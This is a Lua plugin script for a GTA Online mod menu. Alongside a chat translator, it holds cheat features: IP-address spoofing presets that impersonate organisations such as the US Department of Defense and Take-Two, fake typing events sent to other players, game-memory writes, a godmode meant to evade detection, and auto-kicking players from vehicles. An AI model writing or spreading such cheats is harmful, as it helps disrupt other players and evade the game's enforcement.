selectmenu = menu.action(colortradtrad, "Selectioned : ".."Color : "..colorselec, {}, "this will be saved to a config file", function()
	menu.focus(focusref[tonumber(colorselec)])
end)
menu.on_focus(selectmenu, function()
	util.yield(50)
	isfocused = false
end)
for i = 1, 234 do
	focusref[i] = menu.action(colortradtrad, "Color : "..i, {}, "this will be saved to a config file", function() 
		menu.set_menu_name(selectmenu, "Selectioned : ".."Color : "..i)
		colorselec = i
		save()
	end)
	menu.on_focus(focusref[i], function()
		isfocused = false
		util.yield(50)
		isfocused = true
		while isfocused do
			if not menu.is_open() then
				isfocused = false
			end
			ptr1 = memory.alloc()
			ptr2 = memory.alloc()
			ptr3 = memory.alloc()
			ptr4 = memory.alloc()
			HUD.GET_HUD_COLOUR(i, ptr1, ptr2, ptr3, ptr4)
			directx.draw_text(0.5, 0.5, "exemple", 5, 0.75, {r = memory.read_int(ptr1)/255, g = memory.read_int(ptr2)/255, b =memory.read_int(ptr3)/255, a= memory.read_int(ptr4)/255}, true)
			util.yield()
		end
	end)
end


menu.text_input(settingtrad, "Custom label for ["..string.upper(util.get_label_text("MP_CHAT_TEAM")).."] translation message", {"labelteam"}, "leaving it blank will revert it to the original label", function(s, click_type)
	if (s == "") then
		teamchatlabel = util.get_label_text("MP_CHAT_TEAM")
	else
		teamchatlabel = s 
	end
	if not (click_type == 4) then
		save()
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelteam "..teamchatlabel)
end


menu.text_input(settingtrad, "Custom label for ["..string.upper(util.get_label_text("MP_CHAT_ALL")).."] translation message", {"labelall"}, "leaving it blank will revert it to the original label", function(s, click_type)
	if (s == "") then
		allchatlabel = util.get_label_text("MP_CHAT_ALL")
	else
		allchatlabel = s 
	end
	if not (click_type == 4) then
		save()
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelall "..allchatlabel)
end

targetlangmenu = menu.slider_text(chat_trans, "Target Language", {}, "You need to click to aply change", LangName, function(s)
	targetlang = LangLookupByName[LangKeys[s]]
end)

tradlocamenu = menu.slider_text(settingtrad, "Location of Traducted Message", {}, "You need to click to aply change", {"Global Chat networked", "Global Chat not networked", "Team Chat not networked", "Team Chat networked", "Notification"}, function(s)
	Tradloca = s
end)
	
traductself = false
menu.toggle(settingtrad, "Traduct Yourself", {}, "", function(on)
	traductself = on	
end)
traductsamelang = false
menu.toggle(settingtrad, "Traduct even if the language is the same as the desired one", {}, "might not work correctly because google is dumb", function(on)
	traductsamelang = on	
end)
oldway = false
menu.toggle(settingtrad, "Use the old method", {}, players.get_name(players.user()).." [ALL] player_sender : their message", function(on)
	oldway = on	
end)
traduct = false
menu.toggle(chat_trans, "Translator On/Off", {}, "", function(on)
	traduct = on
end, false)

traductmymessage = menu.list(chat_trans, "Send Traducted message")
finallangmenu = menu.slider_text(traductmymessage, "Final Language", {"finallang"}, "Final Languge of your message.																	  You need to click to aply change", LangName, function(s)
   targetlangmessagesend = LangLookupByName[LangKeys[s]]
end)

menu.action(traductmymessage, "Send Message", {"Sendmessage"}, "Input the text For your message", function(on_click)
    util.toast("Please input your message")
    menu.show_command_box("Sendmessage ")
end, function(on_command)
    mytext = on_command
    async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlangmessagesend.."&dt=t&q="..encode(mytext), function(Sucess)
		if Sucess ~= "" then
			translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
			for _, pId in ipairs(players.list()) do
				chat.send_targeted_message(pId, players.user(), string.gsub(translation, "%+", " "), false)
			end
		end
	end)
    async_http.dispatch()
end)
botsend = false
chat.on_message(function(packet_sender, message_sender, text, team_chat)
	if not botsend then
		if not traductself and (packet_sender == players.user()) then
		else
			if traduct then
				async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlang.."&dt=t&q="..encode(text), function(Sucess)
					if Sucess ~= "" then
						translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
						if not traductsamelang and (sourceLang == targetlang)then
						
						else
							if oldway then
								sender = players.get_name(players.user())
								translationtext = players.get_name(packet_sender).." : "..decode(translation)
								colorfinal = 1
							else
								sender = players.get_name(packet_sender)
								translationtext = decode(translation)
								colorfinal = colorselec
							end
							if (Tradloca == 1) then						
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 2) then
								botsend = true
								chat.send_message(players.get_name(packet_sender).." : "..decode(translation), true, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 3) then
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 4) then
								botsend = true
								chat.send_message(players.get_name(packet_sender).." : "..decode(translation), false, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 5) then
								util.toast(players.get_name(packet_sender).." : "..decode(translation), TOAST_ALL)
							end
						end
					end
				end)
				async_http.dispatch()
			end
		end
	end
	botsend = false
end)


run = 0
while run<10 do 
	Tradloca = menu.get_value(tradlocamenu)
	targetlangmessagesend = LangLookupByName[LangKeys[menu.get_value(finallangmenu)]]
	targetlang = LangLookupByName[LangKeys[menu.get_value(targetlangmenu)]]
	util.yield()
	run = run+1
end

	menu.action(detections,"Check Stats", {"check stats"}, "Weak",function(on)
			-- modder detection stuff here
			for pid = 0, 31 do
				local rp = players.get_rank(pid)
				local money = players.get_money(pid)
				local kd = players.get_kd(pid)
				if rp == 120 or rp == 720 or rp >= 1000 then
					notification(PLAYER.GET_PLAYER_NAME(pid) .. " Is G: Modded RP", colors.red)
				end
				if money >= 500000000 then
					notification(PLAYER.GET_PLAYER_NAME(pid) .. " Is G: Modded Money", colors.red)
				end
				if kd <= -1 or kd >= 50 then
					notification(PLAYER.GET_PLAYER_NAME(pid) .. " Is Weak: Modded KD", colors.red)
				end
			end
	end)


spoofpresets = menu.list(misc, "IP Spoofer Repository", {}, "Stand's default GeoIP may show wrong location on some presets", function(); end)

	menu.action(spoofpresets, "Enable IP Spoofer", {}, "", function()
		menu.trigger_commands("spoofip on")
	end)

	menu.action(spoofpresets, "Disable IP Spoofer", {}, "", function()
		menu.trigger_commands("spoofip off")
	end)

	menu.divider(spoofpresets, "Fun IP Presets")

	menu.action(spoofpresets, "Computer Problem Solving (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.146." .. tostring(math.random(48, 123)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "US Department of Defense", {}, "", function()
		menu.trigger_commands("spoofedip " .. "155.21." .. tostring(math.random(224, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "NASA (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.169." .. tostring(math.random(48, 123)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Apple (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "17.234." .. tostring(math.random(0, 127)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Akamai (NL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "23.66." .. tostring(math.random(16, 31)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Microsoft (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "40.89." .. tostring(math.random(224, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Microsoft (NL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "51.144." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	t2spoofpresets = menu.list(spoofpresets, "Take-Two", {}, "", function(); end)
	
	menu.action(t2spoofpresets, "Take-Two (UK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.227." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (US)", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "192.81." .. tostring(math.random(240, 244)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "139.138." .. tostring(math.random(231, 232)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(t2spoofpresets, "Take-Two (AU)", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "139.138.226." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "139.138.244." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(t2spoofpresets, "Take-Two (DE)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.233." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (ES)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.247." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (HU)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.236." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (CZ)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.237." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (IN)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.224." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (SG)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.228." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (JP)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.229." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (CN)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.230." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (HK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.238." .. tostring(math.random(0, 255)))
	end)

	menu.divider(spoofpresets, "VPN IP Presets")

	octospoofpresets = menu.list(spoofpresets, "OVH", {}, "", function(); end)

	menu.action(octospoofpresets, "OVH (AU)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.99." .. tostring(math.random(232, 234)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(octospoofpresets, "OVH (DE)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "145.239.235." .. tostring(math.random(40, 111)))
	end)

	menu.action(octospoofpresets, "OVH (UK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "51.89.208." .. tostring(math.random(88, 95)))
	end)

	menu.action(octospoofpresets, "OVH (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "51.81.119." .. tostring(math.random(0, 15)))
	end)

	menu.action(octospoofpresets, "OVH (CA)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "192.99.250." .. tostring(math.random(208, 223)))
	end)

	tempestpresets = menu.list(spoofpresets, "Tempest Hosting", {}, "", function(); end)

	menu.action(tempestpresets, "Tempest Hosting (US-NY)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.252." .. tostring(math.random(128, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (US-CA)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.252." .. tostring(math.random(0, 127)))
	end)
	
	menu.action(tempestpresets, "Tempest Hosting (US-FL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.254." .. tostring(math.random(128, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (CA)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(128, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (NL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(0, 127)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (UK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.255." .. tostring(math.random(0, 127)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (RU)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(127, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (JP)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.254." .. tostring(math.random(0, 127)))
	end)

	menu.divider(spoofpresets, "Residential IP Presets")

	menu.action(spoofpresets, "Russia", {}, "", function()
		sel = math.random(1,3)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "109.252." .. tostring(math.random(40, 45)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "92.100." .. tostring(math.random(178, 182)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "217.107." .. tostring(math.random(82, 98)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "95.24." .. tostring(math.random(0, 31)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "China", {}, "", function()
		menu.trigger_commands("spoofedip " .. "42.123." .. tostring(math.random(0, 31)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Australia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.168." .. tostring(math.random(40, 53)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "USA Chicago", {}, "", function()
		menu.trigger_commands("spoofedip " .. "73.110." .. tostring(math.random(149, 151)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "USA Baltimore", {}, "", function()
		menu.trigger_commands("spoofedip " .. "69.67." .. tostring(math.random(80, 95)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "USA Texas", {}, "AT&T / IBM", function()
		menu.trigger_commands("spoofedip " .. "198.81.193." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Germany", {}, "", function()
		sel = math.random(1,4)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "84.56." .. tostring(math.random(218, 231)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "46.223." .. tostring(math.random(234, 251)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "93." .. tostring(math.random(192, 255)) .. "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "89.14." .. tostring(math.random(120, 124)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Italy", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "5.89." .. tostring(math.random(190, 197)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "217.200." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Netherlands", {}, "", function()
		sel = math.random(1,4)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "217.123." .. tostring(math.random(124, 125)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "217." .. tostring(math.random(100, 105)) .. "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "139.156." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "94.212." .. tostring(math.random(40, 47)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "France", {}, "", function()
		menu.trigger_commands("spoofedip " .. "2.10." .. tostring(math.random(134, 151)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "United Kingdom", {}, "", function()
		sel = math.random(1,4)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "81.109." .. tostring(math.random(120, 130)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "217.33." .. tostring(math.random(88, 90)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "2.217." .. tostring(math.random(20, 30)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "86.0." .. tostring(math.random(54, 60)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Ireland", {}, "", function()
		menu.trigger_commands("spoofedip " .. "84.203." .. tostring(math.random(0, 10)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Switzerland", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "85.0." .. tostring(math.random(41, 43)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "84.73." .. tostring(math.random(0, 115)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Austria", {}, "", function()
		menu.trigger_commands("spoofedip " .. "194.166." .. tostring(math.random(250, 252)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Denmark", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "83.92." .. tostring(math.random(121, 124)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "87.104." .. tostring(math.random(64, 127)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Belgium", {}, "", function()
		menu.trigger_commands("spoofedip " .. "94.111." .. tostring(math.random(2, 4)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Spain", {}, "", function()
		menu.trigger_commands("spoofedip " .. "93.176." .. tostring(math.random(154, 155)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Portugal", {}, "", function()
		menu.trigger_commands("spoofedip " .. "94.61." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Norway", {}, "", function()
		menu.trigger_commands("spoofedip " .. "80.213." .. tostring(math.random(174, 181)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Finland", {}, "", function()
		menu.trigger_commands("spoofedip " .. "88.113." .. tostring(math.random(64, 83)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Sweden", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "78.72." .. tostring(math.random(240, 245)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "151.252." .. tostring(math.random(128, 172)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Slovakia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "90.64." .. tostring(math.random(50, 55)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Romania", {}, "", function()
		menu.trigger_commands("spoofedip " .. "79.117." .. tostring(math.random(0, 127)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Poland", {}, "", function()
		sel = math.random(1,3)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "178.36." .. tostring(math.random(221, 229)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "193.17." .. tostring(math.random(174, 174)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "217." .. tostring(math.random(96, 99)) .. "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Czech Republic", {}, "", function()
		menu.trigger_commands("spoofedip " .. "185.91." .. tostring(math.random(164, 166)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Bulgaria", {}, "", function()
		menu.trigger_commands("spoofedip " .. "90.154." .. tostring(math.random(162, 164)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Slovenia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "77.111." .. tostring(math.random(53, 53)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Croatia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "185.133." .. tostring(math.random(132, 135)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Albania", {}, "", function()
		menu.trigger_commands("spoofedip " .. "79.106." .. tostring(math.random(160, 191)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Lithuania", {}, "", function()
		menu.trigger_commands("spoofedip " .. "90.140." .. tostring(math.random(13, 13)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Hungary", {}, "", function()
		menu.trigger_commands("spoofedip " .. "84.2." .. tostring(math.random(137, 137)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Greece", {}, "", function()
		menu.trigger_commands("spoofedip " .. "2.85." .. tostring(math.random(227, 227)) .. "." .. tostring(math.random(0, 255)))
	end)

ColorRepo = menu.list(misc, "Color Repository", {"colorrepo"}, "", function(); end)
BasicColors = menu.list(ColorRepo, "Basic Colors", {}, "", function(); end)
SecondaryColors = menu.list(ColorRepo, "Secondary Colors", {}, "", function(); end)

menu.action(BasicColors, "Red", {"red"}, "Copies a red hex value to your clipboard", function()
	util.copy_to_clipboard("ff0000")
end)

menu.action(BasicColors, "Green", {"green"}, "Copies a green hex value to your clipboard", function()
	util.copy_to_clipboard("00ff00")
end)

menu.action(BasicColors, "Blue", {"blue"}, "Copies a blue hex value to your clipboard", function()
	util.copy_to_clipboard("0000ff")
end)

menu.action(BasicColors, "Yellow", {"yellow"}, "Copies a yellow hex value to your clipboard", function()
	util.copy_to_clipboard("ffff00")
end)

menu.action(BasicColors, "Purple", {"purple"}, "Copies a purple hex value to your clipboard", function()
	util.copy_to_clipboard("800080")
end)

menu.action(BasicColors, "Orange", {"orange"}, "Copies an orange hex value to your clipboard", function()
	util.copy_to_clipboard("ffa500")
end)

menu.action(BasicColors, "White", {"white"}, "Copies a white hex value to your clipboard", function()
	util.copy_to_clipboard("ffffff")
end)

menu.action(BasicColors, "Black", {"black"}, "Copies a black hex value to your clipboard", function()
	util.copy_to_clipboard("000000")
end)

menu.action(SecondaryColors, "Magenta", {"magenta"}, "Magenta color for magenta menu", function()
	util.copy_to_clipboard("ff00FF")
end)

menu.action(SecondaryColors, "CEO of Crash", {"ceoofcrash"}, "The color I personally use, in case you wanted it", function()
	util.copy_to_clipboard("00ffa8")
end)


faketype = menu.list(misc, "Spoof Typing indicator", {}, "", function(); end)

menu.action(faketype, "Start Fake Typing", {}, "Will show a typing indicator above your nickname and also make other menus think that you're typing in chat", function()
	menu.trigger_commands("hidetyping off")
	for pids = 0, 31 do
		if players.exists(pids) and pids ~= players.user() then
			send_script_event(747270864, pids, {players.user(), pids, 6769})
		end
	end
end)

menu.action(faketype, "Stop Fake Typing", {}, "", function()
	for pids = 0, 31 do
		if players.exists(pids) and pids ~= players.user() then
			send_script_event(-990958325, pids, {players.user(), pids, 7556})
		end
	end
end)

menu.toggle(faketype, "Anti-Type", {}, "AKA 'Suppress Typing Indicator', hides the fact that you're typing", function(on)
	if on then
		menu.trigger_commands("hidetyping on")
	else
		menu.trigger_commands("hidetyping off")
	end
end)

menu.action(misc, "Fix Casino Heist", {}, "If you've bricked your casino heist by not doing the scoping mission, give this a try :)", function()
	STATS.STAT_SET_INT(util.joaat("MP0_H3OPT_POI"), 0, true)
	STATS.STAT_SET_INT(util.joaat("MP0_H3OPT_ACCESSPOINTS"), 0, true)
end)

menu.toggle_loop(misc, 'Increase Kosatka Missile Range', {'krange'}, 'You can use it anywhere in the map now', function ()
    if util.is_session_started() then
    memory.write_float(memory.script_global(262145 + 30176), 200000.0)
    end
end)


menu.toggle(misc,"Alternate 'Godmode'", {"godmode2"}, "Sets your max health really high and turns on autoheal. May bypass some menu's godmode detection due to your entity not being truly invincible.", function(on)  
	local me = players.user()   
	local PlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(me)
	if on then
		PED.SET_PED_MAX_HEALTH(PlayerPed,  90000)
		menu.trigger_commands("godmode off")
		menu.trigger_commands("demigodmode on")
		menu.trigger_commands("gracefulness on")
		menu.trigger_commands("paralock on")

	else
		PED.SET_PED_MAX_HEALTH(PlayerPed, 328)
		menu.trigger_commands("demigodmode off")
		notification("you may want to turn normal godmode back on again :)", colors.red)
	end
end)

--[[menu.toggle(misc,"Player Bar", {"playerbar"}, "Turns on an overlay with a list of names and tags based on certain flags", function(on)
	if on then
		playerbar = true
	else
		playerbar = false
	end
end, false)]]

joining = false
menu.toggle(misc, "Player Joining Notifications", {}, "", function(on_toggle)
	if on_toggle then
		joining = true
	else
		joining = false
	end
end)

notification("Currupt Script has been successfully loaded!", colors.green)

async_http.init('pastebin.com', '/raw/j8iZnWjV', function(authver)
	if tonumber(authver) ~= version then -- why the fuck do i have to tonumber this when its literally already a number :waitwhat:
		util.toast(version .. " " .. authver)
		notification("Your using the BEST version of Currupt Script  available!", colors.red)
		menu.hyperlink(menu.my_root(), "Join Kwengz Server! #KWENGZ-IS-KING  #CANDY-FAX", "https://discord.gg/KHOS")
	end
end, function()
end)
async_http.dispatch()


local InitialPlayersList = players.list(true, true, true) -- Obtain list of players from Stand API
for i=1, #InitialPlayersList do -- Loop through the received player list
	GenerateFeatures(InitialPlayersList[i]) -- Generate Features for every player
end
InitialPlayersList = nil -- Discard the table as it is no longer needed (optional; most beginners will not do this)

players.on_join(function(pid)
	while true do
		if joining then
			notification(PLAYER.GET_PLAYER_NAME(pid) .. " joined", colors.red)
		end
		util.yield()
	end
end)

players.on_join(GenerateFeatures)
players.on_leave(update_leave)
players.on_join(update_join)
--util.on_stop(cleanup)

--for vehicle chaos
util.create_thread(function()
	while true do
		if (chaos) then
			vehicles = entities.get_all_vehicles_as_handles()
			cur_players = players.list(true,true,true)
			for k,v in pairs(vehicles) do
				driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(v, -1)
				if(PED.GET_PED_TYPE(driver) > 4) then
					VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(v, false, true)
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(v, speed)
					VEHICLE.SET_VEHICLE_GRAVITY(v, gravity)
				end
			end
		end
		util.yield()
	end
end)

	-- for car drifting
util.create_thread(function()
	while true do
		if drift then
			local veh = entities.get_user_vehicle_as_handle()
			if veh then
				if PAD.IS_CONTROL_PRESSED(1, 61) then
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, true)
				else
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, false)
				end
			end        
		end
		util.yield()
	end
end)



--for oppressor blacklist
util.create_thread(function()
	while true do
		if kick_players then
			local cur_players = players.list(target_self,target_friends,true)
			for k,v in pairs(cur_players) do
				local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(v)
				local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
				if vehicle then
					local hash = util.joaat("oppressor2")
					if VEHICLE.IS_VEHICLE_MODEL(vehicle, hash) then
						menu.trigger_commands("vehkick" .. PLAYER.GET_PLAYER_NAME(v))
						if lock_vehicle then
							VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(vehicle, true)
						end
					end
				end
			end
		end
		util.yield()
	end
end)

--[[
default = {
	["r"] = 255/255,
	["g"] = 255/255,
	["b"] = 255/255,
	["a"] = 255/255
} 
god = { -- need to find memory address
	["r"] = 255/255,
	["g"] = 175/255,
	["b"] = 0/255,
	["a"] = 255/255
} 
interior = { -- done
	["r"] = 150/255,
	["g"] = 150/255,
	["b"] = 150/255,
	["a"] = 255/255
} 
otr = { -- done
	["r"] = 0/255,
	["g"] = 255/255,
	["b"] = 255/255,
	["a"] = 255/255
}
host = {
	["r"] = 255/255,
	["g"] = 200/255,
	["b"] = 0/255,
	["a"] = 255/255
} 
dead = {
	["r"] = 175/255,
	["g"] = 100/255,
	["b"] = 100/255,
	["a"] = 255/255
} 
modder = {
	["r"] = 255/255,
	["g"] = 0/255,
	["b"] = 0/255,
	["a"] = 255/255
}  
friend = {
	["r"] = 0/255,
	["g"] = 255/255,
	["b"] = 0/255,
	["a"] = 255/255
}
spectating = {
	["r"] = 255/255,
	["g"] = 0/255,
	["b"] = 255/255,
	["a"] = 255/255
}


playerbar = false
util.create_thread(function() -- player bar
	while true do
		if playerbar then
			local PlayersList = players.list(true, true, true) 
			if #PlayersList < 11 then
				draw_box(0, 0, 1, 0.02, 0.5)
			elseif #PlayersList < 21 then
				draw_box(0, 0, 1, 0.036, 0.5)
			elseif #PlayersList < 31 then
				draw_box(0, 0, 1, 0.055, 0.5)
			else
				draw_box(0, 0, 1, 0.07, 0.5)
			end
			local posx = 0.001
			local posy = 0.001

			for _, pid in pairs (PlayersList) do 
				if true then
					local PlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
					local PlayerVehicle = PED.GET_VEHICLE_PED_IS_IN(PlayerPed, false)
					local color = default
					local tag = ""
